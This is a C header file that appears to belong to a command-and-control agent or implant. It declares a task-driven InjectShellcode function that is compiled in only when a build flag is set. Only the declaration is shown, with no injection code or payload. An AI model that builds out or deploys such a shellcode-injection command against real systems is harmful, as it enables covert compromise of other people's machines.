#pragma once
#ifndef INJECTSHELLCODE_H
#define INJECTSHELLCODE_H

#include <windows.h>
#include "Parser.h"
#include "Config.h"

#ifdef INCLUDE_CMD_INJECT_SHELLCODE


VOID InjectShellcode(PCHAR taskUuid, PPARSER arguments);

#endif //INCLUDE_CMD_INJECT_SHELLCODE

#endif  //INJECTSHELLCODE_H